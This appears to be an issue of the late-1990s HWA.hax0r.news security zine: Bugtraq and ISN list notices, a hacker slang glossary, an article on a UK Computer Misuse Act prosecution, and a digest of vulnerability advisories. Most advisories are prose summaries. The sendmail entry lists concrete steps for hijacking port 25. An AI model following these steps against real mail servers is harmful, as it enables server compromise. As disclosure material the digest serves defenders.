     The Hacker's Ethic

     Sadly, due to the traditional ignorance and sensationalizing of the mass
     media, the once-noble term hacker has become a perjorative.
     
     Among true computer people, being called a hacker is a compliment. One of
     the traits of the true hacker is a profoundly antibureaucratic and
     democratic spirit. That spirit is best exemplified by the Hacker's Ethic.
     
     This ethic was best formulated by Steven Levy in his 1984 book Hackers:
     Heroes of the Computer Revolution. Its tenets are as follows:

      1 - Access to computers should be unlimited and total. 
      2 - All information should be free. 
      3 - Mistrust authority - promote decentralization. 
      4 - Hackers should be judged by their hacking not bogus criteria such as
          degrees, age, race, or position. 
      5 - You create art and beauty on a computer, 
      6 - Computers can change your life for the better. 

     The Internet as a whole reflects this ethic.

               A Comment on FORMATTING: 
               
               
               Oct'99 - Started 80 column mode format, code is still left
                        untouched since formatting will destroy syntax.               
               
   
               I received an email recently about the formatting of this
               newsletter, suggesting that it be formatted to 75 columns
               in the past I've endevoured to format all text to 80 cols
               except for articles and site statements and urls which are
               posted verbatim, I've decided to continue with this method
               unless more people complain, the zine is best viewed in
               1024x768 mode with UEDIT.... - Ed

   SYNOPSIS (READ THIS)
   --------------------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.
    
    
    Stuff you can email:
    
    - Prank phone calls in .ram or .mp* format
    - Fone tones and security announcements from PBX's etc
    - fun shit you sampled off yer scanner (relevant stuff only like #2600 meeting activities)
    - reserved for one smiley face ->        :-)            <-
    - PHACV lists of files that you have or phac cd's you own (we have a burner, *g*)
    - burns of phac cds (email first to make sure we don't already have em)
    - Any and all telephone sounds/tones/beeps/trunk drops/line tests/etc in .ram etc format or .mp*
    

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

    BUGTRAQ - Subscription info
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    What is Bugtraq?

    Bugtraq is a full-disclosure UNIX security mailing list, (see the info
    file) started by Scott Chasin <chasin@crimelab.com>. To subscribe to
    bugtraq, send mail to listserv@netspace.org containing the message body
    subscribe bugtraq. I've been archiving this list on the web since late
    1993. It is searchable with glimpse and archived on-the-fly with hypermail.

    Searchable Hypermail Index;

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not
    "CC" the bugtraq reflector address if the response does not meet the above criteria.

    Remember: YOYOW.

    You own your own words. This means that you are responsible for the words that you post on this list and that
    reproduction of those words without your permission in any medium outside the distribution of this list may be
     challenged by you, the author.

    For questions or comments, please mail me:

    UPDATED Sept/99 - Sent in by Androthi, tnx for the update
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    

      I am pleased to inform you of several changes that will be occurring
      on June 5th. I hope you find them as exciting as I do.
      
      
      BUGTRAQ moves to a new home
      ---------------------------
      
      
      First, BUGTRAQ will be moving from its current home at NETSPACE.ORG
      to SECURITYFOCUS.COM. What is Security Focus you ask? Wait and read
      below. Other than the change of domains nothing of how the list
      is run changes. I am still the moderator. We play by the same rules.
      
      
      Security Focus will be providing mail archives for BUGTRAQ. The
      archives go back longer than Netspace's and are more complete than
      Geek-Girl's.
      
      
      The move will occur one week from today. You will not need to
      resubscribe. All your information, including subscription options
      will be moved transparently.
      
      
      Any of you using mail filters (e.g. procmail) to sort incoming
      mail into mail folders by examining the From address will have to
      update them to include the new address. The new address will be:
      
      
                            BUGTRAQ@SECURITYFOCUS.COM
      
      
      Security Focus also be providing a free searchable vulnerability
      database.
      
      
      BUGTRAQ es muy bueno
      --------------------
      
      
      It has also become apparent that there is a need for forums
      in the spirit of BUGTRAQ where non-English speaking people
      or people that don't feel comfortable speaking English can
      exchange information.
      
      
      As such I've decided to give BUGTRAQ in other languages a try.
      BUGTRAQ will continue to be the place to submit vulnerability
      information, but if you feel more comfortable using some other
      language you can give the other lists a try. All relevant information
      from the other lists which have not already been covered here
      will be translated and forwarded on by the list moderator.
      
      
      In the next couple of weeks we will be introducing BUGTRAQ-JP
      (Japanese) which will be moderated by Nobuo Miwa <n-miwa@lac.co.jp>
      and BUGTRAQ-SP (Spanish) which will be moderated by CORE SDI S.A.
      from Argentina <http://www.core-sdi.com/> (the folks that brought you
      Secure Syslog and the SSH insertion attack).
      
      
      What is Security Focus?
      -----------------------
      
      
      Security Focus is an exercise in creating a community and a security
      resource. We hope to be able to provide a medium where useful and
      successful resources such as BUGTRAQ can occur, while at the same
      time providing a comprehensive source of security information. Aside
      from moving just BUGTRAQ over, the Geek-Girl archives (and the Geek Girl
      herself!) have moved over to Security Focus to help us with building
      this new community. The other staff at Security Focus are largely derived
      from long time supporters of Bugtraq and the community in general. If
      you are interested in viewing the staff pages, please see the 'About'
      section on www.securityfocus.com.
      
      
      On the community creating front you will find a set of forums
      and mailing lists we hope you will find useful. A number of them
      are not scheduled to start for several weeks but starting today
      the following list is available:
      
      
      * Incidents' Mailing List. BUGTRAQ has always been about the
         discussion of new vulnerabilities. As such I normally don't approve
         messages about break-ins, trojans, viruses, etc with the exception
         of wide spread cases (Melissa, ADM worm, etc). The other choice
         people are usually left with is email CERT but this fails to
         communicate this important information to other that may be
         potentially affected.
      
      
         The Incidents mailing list is a lightly moderated mailing list to
         facilitate the quick exchange of security incident information.
         Topical items include such things as information about rootkits
         new trojan horses and viruses, source of attacks and tell-tale
         signs of intrusions.
      
      
         To subscribe email LISTSERV@SECURITYFOCUS.COM with a message body
         of:
      
      
                   SUBS INCIDENTS FirstName, LastName
      
      
      Shortly we'll also be introducing an Information Warfare forum along
      with ten other forums over the next two months. These forums will be
      built and moderated by people in the community as well as vendors who
      are willing to take part in the community building process.
      *Note to the vendors here* We have several security vendors who have
      agreed to run forums where they can participate in the online communities.
      If you would like to take part as well, mail Alfred Huger,
      ahuger@securityfocus.com.
      
      
      On the information resource front you find a large database of
      the following:
      
      
      * Vulnerabilities. We are making accessible a free vulnerability
         database. You can search it by vendor, product and keyword. You
         will find detailed information on the vulnerability and how to fix it,
         as well are links to reference information such as email messages,
         advisories and web pages. You can search by vendor, product and
         keywords. The database itself is the result of culling through 5
         years of BUGTRAQ plus countless other lists and news groups. It's
         a shining example of how thorough full disclosure has made a significant
         impact on the industry over the last half decade.

    [ISN] Security list

    This is a low volume list with lots of informative articles, if I had my
    way i'd reproduce them ALL here, well almost all .... ;-) - Ed

      --[ New ISN announcement (New!!)
      
      
      Sender:       ISN Mailing List <ISN@SECURITYFOCUS.COM>
      From:         mea culpa <jericho@DIMENSIONAL.COM>
      Subject:      Where has ISN been?
      Comments: To: InfoSec News <isn@securityfocus.com>
      To:           ISN@SECURITYFOCUS.COM
      
      
      It all starts long ago, on a network far away..
      
      
      Not really. Several months ago the system that hosted the ISN mail list
      was taken offline. Before that occured, I was not able to retrieve the
      subscriber list. Because of that, the list has been down for a while. I
      opted to wait to get the list back rather than attempt to make everyone
      resubscribe.
      
      
      As you can see from the headers, ISN is now generously being hosted by
      Security Focus [www.securityfocus.com]. THey are providing the bandwidth,
      machine, and listserv that runs the list now.
      
      
      Hopefully, this message will find all ISN subscribers, help us weed out
      dead addresses, and assure you the list is still here. If you have found
      the list to be valuable in the past, please tell friends and associates
      about the list. To subscribe, mail listserv@securityfocus.com with
      "subscribe isn firstname lastname". To unsubscribe, "unsubscribe isn".
      
      
      As usual, comments and suggestions are welcome. I apologize for the down
      time of the list. Hopefully it won't happen again. ;)

      InfoSec News is a privately run, medium traffic list that caters 
      to distribution of information security news articles. These 
      articles will come from newspapers, magazines, online resources, 
      and more.
      
      
      The subject line will always contain the title of the article, so that
      you may quickly and effeciently filter past the articles of no interest.
      
      
      This list will contain:
      
      
      o       Articles catering to security, hacking, firewalls, new security
              encryption, products, public hacks, hoaxes, legislation affecting
              these topics and more.
      
      
      o       Information on where to obtain articles in current magazines.
      
      
      o       Security Book reviews and information.
      
      
      o       Security conference/seminar information.
      
      
      o       New security product information.
      
      
      o       And anything else that comes to mind..
      
      
      Feedback is encouraged. The list maintainers would like to hear what
      you think of the list, what could use improving, and which parts
      are "right on". Subscribers are also encouraged to submit articles
      or URLs. If you submit an article, please send either the URL or
      the article in ASCII text. Further, subscribers are encouraged to give
      feedback on articles or stories, which may be posted to the list.
      
      
      Please do NOT:
      
      
              * subscribe vanity mail forwards to this list
      
      
              * subscribe from 'free' mail addresses (ie: juno, hotmail)
      
      
              * enable vacation messages while subscribed to mail lists
      
      
              * subscribe from any account with a small quota
      
      
      All of these generate messages to the list owner and make tracking
      down dead accounts very difficult. I am currently receiving as many 
      as fifty returned mails a day. Any of the above are grounds for
      being unsubscribed. You are welcome to resubscribe when you address
      the issue(s).

    1. We do NOT work for the government in any shape or form.Unless you count paying
       taxes ... in which case we work for the gov't in a BIG WAY. :-/

    2. MOSTLY Unchanged since issue #1, although issues are a digest of recent news
       events its a good idea to check out issue #1 at least and possibly also the
       Xmas issue for a good feel of what we're all about otherwise enjoy - Ed ...

 00.4 Whats in a name? why HWA.hax0r.news??
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                             
      
      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour <sic> also wigger
              Vanilla Ice is a wigger, The Beastie Boys and rappers speak using
              ebonics, speaking in a dark tongue ... being ereet, see pheer

    EoC    - End of Commentary

    EoA    - End of Article or more commonly @HWA

    EoF    - End of file

    EoD    - End of diatribe (AOL'ers: look it up)

    FUD    - Coined by Unknown and made famous by HNN <g> - "Fear uncertainty and doubt",
            usually in general media articles not high brow articles such as ours or other
            HNN affiliates ;)

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
            some coffee?' or can you hax0r some bread on the way to the table please?'

            2 - A tool for cutting sheet metal.

    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper
             noun means the hackernews site proper. k? k. ;&

    HNN    - Hacker News Network and its affiliates http://www.hackernews.com/affiliates.html

    J00    - "you"(as in j00 are OWN3D du0d) - see 0wn3d

    NFC   - Depends on context: No Further Comment or No Fucking Comment

    NFW   - No fuckin'way

   *0WN3D - You are cracked and owned by an elite entity see pheer
   *OFCS  - Oh for christ's sakes

    PHACV - And variations of same <coff>
            Phreaking, Hacking, Anarchy, Cracking, Carding (CC) Groups Virus, Warfare

          Alternates: H - hacking, hacktivist
                      C - Cracking <software>
                      C - Cracking <systems hacking>
                      V - Virus
                      W - Warfare <cyberwarfare usually as in Jihad>

                     CT - Cyber Terrorism

   *PHEER -  This is what you do when an ereet or elite person is in your presence
            see 0wn3d

   *RTFM  - Read the fucking manual - not always applicable since some manuals are
            pure shit but if the answer you seek is indeed in the manual then you
            should have RTFM you dumb ass.

    TBC   - To Be Continued also 2bc (usually followed by ellipses...) :^0

    TBA   - To Be Arranged/To Be Announced also 2ba

    TFS   - Tough fucking shit.

   *w00t  - 1 - Reserved for the uber ereet, noone can say this without severe repercussions
            from the underground masses. also "w00ten" <sic>

            2 - Cruciphux and sAs72's second favourite word (they're both shit stirrers)

            usually shortly after reaching the ZEN like state something will break that
            you just 'fixed' or tweaked.

03.0  Who is Chris Buckley and why was he busted?
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      The name Chris Buckley is well known in the British H/P newsgroups but he 
      has nothing to do with HP, He's just an internet ng junkie. He posted
      up to 40 emails a day and took it upon himself to act as BT's "help" guide
      on one particular newsgroup hurling insults and the like at hapless newbies
      that were actually looking for tech support and help. BT it seems didn't 
      take too kindly to this action and decided to have his account pulled, in
      the process of tracking down his account it was discovered that he was indeed
      using 'borrowed' accounts and a 800 number to access the net that he had no
      right to be using, hence his downfall and a visit by BT security and the local
      Police. Durzell picks up on the story .... - Ed

      When anonymity is no defence Sunday, November 14, 1999, 03:44

      The Internet as it stands today is an almost unimaginable concept. If 
      someone were to come up to me in the street (assuming of course that I`d 
      never heard of the `Net) and said I could speak to anyone in the World, 
      `go` anywhere I liked, do pretty much whatever I wanted from the relative 
      sanctity and seclusion of my bedroom, I`d never have believed them.

      The fact that this supposed unreal concept is an everyday reality to 
      myself and millions of others is a testament to how far technology has 
      taken us in the past few years. The inherent problem however with the `Net 
      in its existing incarnation is that for many of us it takes on a form that 
      is quite different from everyday life. Because we are so isolated and 
      protected from this mythical World out there, a fundamental sociological 
      safeguard is missing. Whereas many of us know the divide in everyday life 
      between right and wrong, lawful and unlawful acts - these same principals 
      are often jaded or even non-existant on the Internet. Out there the 
      perception among the masses is that the likes of warez`ing (i.e. to 
      download commercial material) software is `the done thing`, it`s not 
      really stealing, noone gets hurt. Likewise insulting others openly isn`t 
      `real`, it`s only text after all - it`s not the same as RealLifeTM really. 
      However hardened one`s resolve is against abusing others, illegally 
      downloading software and other such activities is all too easy to slip 
      into, after all noone can doubt that it`s far easier for many people to 
      hide behind a screen and email your thoughts and opinions freely without 
      consequence than it is to attempt to make the same observations in person, 
      especially if they have a controversial nature.

      Most of us are fortunate to be able to look upon our Internet existences 
      to date retrospectively, to see where perhaps we made errors of judgements 
      or indeed partook in acts that at the time seemed to be `part of the `Net 
      experience`, that are in actual fact illegal, costly and damaging to 
      individuals and/or companies whom they affect. For a minority however this 
      luxury is not available to them, people who realised too late the 
      respective `errors in their ways`..

      One such individual is Chris Buckley.

      Chris Buckley is somewhat unique in the Internet online community, being 
      someone who is both unknown to a faction of the community, yet synonymous 
      to the rest. His notoriety stems mainly from activities on Usenet 
      (Internet newsgroups) together, more recently, with his usage of several 
      highly publicised BT 0800 staff/engineer numbers. What differentiates Mr 
      Buckley from the thousands of others that had been using these open 
      staff/engineer numbers however is that for reasons best known to 
      themselves, British Telecom are proactively seeking prosecution of this 
      one individual, on charges relating solely to acts he (allegedly) 
      perpetrated on the Internet. These charges are as follows:

      1) At (town name) in the county of (county) on 5th July 1999 knowingly 
      caused a computer to perform a function with intent to obtain unauthorised 
      access to the computers running BT Internet. Contrary to Section 1 of the 
      Computer Misuse Act 1990

      2) At (town name) in the county of (county) on and between 1st and 7th 
      July 1999 sent by means of a public telecommunication system in excess of 
      100 e-data messages for the purpose of causing annoyance.

         Contrary to Section 42 of the Telecommunications Act 1984

      3) At (town name) in the county of (county) on 5th July 1999 made a 
      telephone call for 9 hours 46 minutes and 58 seconds using a public 
      telecommunications system with the intention of avoiding payment for the 
      call. Contrary to Section 42 of the Telecommunications Act 1984

      As Chris Buckley has rightly stated in correspondance following the 
      announcement of the charges, this is by no means a token case - it is in 
      effect a landmark action by the telecommunications bohemeth which, if 
      successful, could lead to charges being brought against hundreds maybe 
      even thousands of other `Net users that have used this BT 0800 
      staff/engineer number illegally. Of course the issue of whether or not the 
      trial is eventually successful is not the focal point of this entire 
      issue, moreof the fact that this case marks perhaps the first ever where a 
      UK company has taken on an individual based solely on activities that in 
      many people`s eyes would deem to be trivial or circumstantial. After all, 
      who is to say what is classified as `annoying` e-mail? Can an individual 
      be expected to pay for a freephone (0800) number that allows him/her to 
      connect on a regular ISP account?

      All these questions will be answered in the trial of Chris Buckley, and I 
      for one will be awaiting the final outcome with trepidation, as it could 
      effectively spell the end of the Internet as many of us know it.

      I.   INTRODUCTION
      -----------------
      
      Welcome to the Security Focus 'week in review' newsletter issues 14 & 15 sponsored by NT OBJECTives, Inc.
      <http://www.ntobjectives.com>. Issue 14 as you may have guessed failed to
      be delivered. It seems to have been eaten by a somewhat overworked
      Listserver. The last two weeks have been two of the bussiest in Bugtraq's
      history with 36 vulnerabilities being published over the list.

      II.  BUGTRAQ SUMMARY 1999-11-02 to 1999-11-14
      ---------------------------------------------
      
      
      1. Multiple Vendor CDE dtappgather Vulnerabilities
      BugTraq ID: 131
      Remote: No
      Date Published: 1999-11-03
      Relevant URL:
      http://www.securityfocus.com/bid/131
      Summary:
      
      Due to improper checking of ownership, the dtappgather utility shipped
      with the Common Desktop Environment allows arbitrary users to overwrite
      any file present on the filesystem, regardless of the owner of the file.
      
       dtappgather uses a directory of permissions 0777 to create temporary
      files used by each login session.
      /var/dt/appconfig/appmanager/generic-display-0 is not checked for
      existence prior to the opening of the file by dtappgather, and as such, if
      a user were to create a symbolic link from this file to another on the
      filesystem, the permissions of this file would be changed to 0666.
      
      An additional bug exists whereby dtappgather blindly uses the contents of
      the DTUSERSESSION environment variable. By setting this variable to point
      to a file on the filesystem, its permissions can also be changed. As this
      command takes place relative to the /var/dt/appconfig directory, a series
      of '..' are required to establish the root directory, after which any file
      can be altered.
      
      2. Canna subsystem 'uum' Buffer Overflow Vulnerability
      BugTraq ID: 757
      Remote: No
      Date Published: 1999-11-02
      Relevant URL:
      http://www.securityfocus.com/bid/757
      Summary:
      
      Canna is a Japanese input system available as free software. Canna
      provides a unified user interface for inputting Japanese.
      
      Canna supports Nemacs(Mule), kinput2 and canuum. All of these tools can be
      used by a single customization file, romaji-to-kana conversion rules and
      conversion dictionaries, and input Japanese in the same way.
      
      Canna converts kana to kanji based on a client-server model and supports
      automatic kana-to-kanji conversion.
      
      The Canna subsystem on certain UNIX versions contains a buffer overflow in
      the 'uum' program. Uum is a Japanese input tty frontend for Canna.
      Regrettably, certain versions are vulnerable to a buffer overflow attack
      via unchecked user supplied data with the '-D' option. Since 'uum' is
      installed as SUID root this may result in a root level compromise.
      
      3. Canna subsystem 'canuum' Buffer Overflow Vulnerability
      BugTraq ID: 758
      Remote: No
      Date Published: 1999-11-02
      Relevant URL:
      http://www.securityfocus.com/bid/758
      Summary:
      
      Canna is a Japanese input system available as free software. Canna
      provides a unified user interface for inputting Japanese.
      
      Canna supports Nemacs(Mule), kinput2 and canuum. All of these tools can be
      used by a single customization file, romaji-to-kana conversion rules and
      conversion dictionaries, and input Japanese in the same way.
      
      Canna converts kana to kanji based on a client-server model and supports
      automatic kana-to-kanji conversion.
      
      The Canna subsystem on certain UNIX versions contains a buffer overflow in
      the 'canuum' program. Canuum is a Japanese input tty frontend for Canna
      using uum. Certain versions have a buffer overflow via unchecked user
      supplied data in the -k,-c,-n options.
      
      Since this program is installed SUID root this attack will result in a root level compromise.
      
      4. Microsoft IE Yamaha MidiPlug Buffer Overflow Vulnerability
      BugTraq ID: 760
      Remote: Yes
      Date Published: 1999-11-02
      Relevant URL:
      http://www.securityfocus.com/bid/760
      Summary:
      
      There is a buffer overflow in the MidiPlug that may allow arbitrary code
      to be executed on the local host. This overflow occurs if a long "Text"
      variable is specified within an EMBED tag in a web page. Instructions in
      the text variable may be executed when a user visits the malicious web
      page.
      
      5. BTD Zom-Mail Buffer Overflow Vulnerability
      BugTraq ID: 761
      Remote: Yes
      Date Published: 1999-11-02
      Relevant URL:
      http://www.securityfocus.com/bid/761
      Summary:
      
      In certain versions of the BTD Zom-Mail server there exists a buffer
      overflow which may be remotely exploitable by malicious users. The problem
      in question is in the handling of overly (past 256 chars) long file names
      for file attachments.
      
      6. AN-HTTPd CGI Vulnerabilities
      BugTraq ID: 762
      Remote: Yes
      Date Published: 1999-11-02
      Relevant URL:
      http://www.securityfocus.com/bid/762
      Summary:
      
      Certain versions of the AN-HTTPd server contain default CGI scripts that
      allow code to be executed remotely. This is due to poor sanity checking on
      user supplied data.
      
      7. IBM HomePagePrint Buffer Overflow Vulnerability
      BugTraq ID: 763
      Remote: Yes
      Date Published: 1999-11-02
      Relevant URL:
      http://www.securityfocus.com/bid/763
      Summary:
      
      Certain versions of the IBM Web page printout software "IBM HomePagePrint
      " can in some instances be remotely exploited by malicious webservers. The
      problem lies in a buffer overflow in the code which handles IMG_SRC tags.
      If a page containing a specially constructed IMG SRC tag is previewed or
      printed using the IBM HomePagePrint software, arbitrary code can be run on
      the client.
      
      8. Hylafax 'faxalter' Buffer Overflow Vulnerability
      BugTraq ID: 765
      Remote: No
      Date Published: 1999-11-03
      Relevant URL:
      http://www.securityfocus.com/bid/765
      Summary:
      
      Hylafax is a popular fax server software package designed to run on
      multiple UNIX operating systems. Some versions of Hylafax ship with a
      vulnerable sub program 'faxalter'. This program is installed SUID UUCP and
      has a buffer overflow which if exploited will allow a malicious user to
      gain UUCP privileges.
      
      Because the important programs are executed as root, such as Minicom (a
      popular modem terminal program) or cu(1) and are in the UUCP group and
      therefore writable by the same group they could be trojaned by the
      attacker. A successful scenario in this event would lead to a root
      compromise.

      Summary:
      
      If window.open is called with a target URL that redirects to a client-side
      file and then a variable is created pointing to the contents of the new
      window, the contents of the new window (the local file) can be read and
      possibly manipulated or transmitted by other code in the webpage.
      
      10. Real Server Administrator Port Buffer Overflow Vulnerability
      BugTraq ID: 767
      Remote: Yes
      Date Published: 1999-11-04
      Relevant URL:
      http://www.securityfocus.com/bid/767
      Summary:
      
      At installation, the Real Server software randomly selects an unused port
      as the remote administration port. This port is used by Real Server's
      remote web administration feature. To access this feature, the correct
      port must be specified and a valid username/password pair must be entered.
      By sending a long response to this authentication request, the buffer can
      be overwritten and arbitrary code can be executed on the server.

      Summary:
      
      Spoolss.exe, AKA the spooler service, which handles all print requests for
      the NT operating system, has a number of APIs with unchecked buffers. Some
      of these can only be executed by Power Users or Administrators, but some
      are accessible to all authenticated users. Many of the overflows will
      write directly into the EIP register, meaning that an exploit could be
      created to run arbitrary code as SYSTEM.

      Summary:
      
      The spooler service (spoolss.exe) allows local users to add their own dll
      files and have the spooler run them at SYSTEM level. This could lead to
      privilege escalation all the way up to Administrator level. The problem is
      in the function AddPrintProvider().
      
      13. Cobalt RaQ2 cgiwrap Vulnerability
      BugTraq ID: 777
      Remote: No
      Date Published: 1999-11-08
      Relevant URL:
      http://www.securityfocus.com/bid/777
      Summary:
      
      Cobalt RaQ2 servers come with a program called "cgiwrap", which acts as a
      wrapper for cgi programs so that they run with the uid of their user
      instead of ' nobody'. It may be possible to cause a denial of service to
      websites hosted on the server or compromise web data.
      
      cgiwrap interprets subdirectories of web/ in which cgi scripts are run as
      user directories, and if a user is created which happens to have the same
      name as the directory which scripts run from - cgiwrap will try to run a
      file that doesn't exist in that user's directory. In a worse case, a
      script can be substituted and important data submitted to web forms
      compromised.

      Summary:
      
      There are several CGI programs that ship with the Alibaba webserver. Many
      of these do not do proper input handling, and therefore will allow
      requests for access to files outside of normal or safe webserver practice.
      This results in various situations where an attacker can view, overwrite,
      create and delete files anywhere on the server.

      A malicious user can create an executable file, compress it into a cab
      file, and rename it to have a multimedia file extension (e.g. .MID). He
      can then send this file as an attachment to an Outlook user as well as
      some Javascript code. When the user double-clicks on the on the multimedia
      attachment it will save the executable file in a known location on the
      system. The Javascript will then execute the attachment on the target
      machine.

      Summary:
      
      Certain versions of the FTGate Advanced Mail Server have a vulnerability
      in their web based administration interface. The vulnerability is that the
      webserver allows users to traverse the directory structure outside of the
      Webroot directory.
      
      Therefore malicious users may read files outside of their permitted areas,
      including but not limited to private email and password files.

      Summary:
      
      Etype's Eserv product is designed to be a one-source internet connectivity
      solution, incorporating mail, web, ftp, and proxy servers into one
      package. The web server will allow remote browsing of the entire
      filesystem by the usage of ../ strings in the URL. This gives an attacker
      read access to every file on the server's filesystem that the webserver
      has access to.
      
      19. Sendmail Socket Hijack Vulnerability
      BugTraq ID: 774
      Remote: No
      Date Published: 1999-11-05
      Relevant URL:
      http://www.securityfocus.com/bid/774
      Summary:
      
      Through exploiting a combination of seemingly low-risk vulnerabilities in
      sendmail, it is possible for a malicious local user to have an arbitrary
      program inherit (or "hijack") the file descriptor for the socket listening
      on (priviliged) port 25.
      
      The problem begins with the way sendmail handles the failure of an
      accept() call.  The accept() call is made when a tcp syn packet is
      recieved by a listening tcp socket.  When the three-way handshake does not
      complete (as is the consequence of a half-open tcp "stealth scan"),
      accept() fails and sendmail closes all listening sockets and sleeps for 5
      seconds.
      
      The second problem is that a user can start the sendmail daemon if a more
      obscure argument is passed (-bD).  The -bD flag tells sendmail to run as a
      daemon, but in foreground.  User priviliges are not checked against for
      this option, allowing any user to start sendmail.
      
      The third problem is how sendmail reacts to a HUP signal.  When a HUP is
      recieved, sendmail calls execve(argv[0],..) to restart itself.  The
      problem here is obvious, since argv[0] can be changed to anything.  The
      bigger problem here though, is that the fourth file descriptor is not
      closed before this is done (which happens to be the one for the listening
      tcp socket), thus any argv[0] which is executed via the execve() call will
      inherit the descriptor.
      
      The steps required to exploit this are as follows:
      
      - From another machine, use nmap to do a "half open scan" on port 25 of the target host.
        (this will make sendmail go to sleep for five seconds, unattached to port 25)
      
      - In the 5 seconds that sendmail spends sleeping, call sendmail -bD as a
      user locally on the target box with noexec and set argv[0] to the program
      of your choice. (noexec is a program which allows you to set argv[0] to
      whatever you'd like).
      
      - Send the process a HUP, which is ok since you own the process. (The
      program you specified in the noexec command which is to be argv[0] now has
      the file descriptor for the socket listening on port 25).
      
      The consequences of this are full compromise of the mail server.  An
      attacker could write a trojan "mail server" that would respond on port 25
      to legitimate smtp connections.
      
      
      20. Guestbook CGI Remote Command Execution Vulnerability
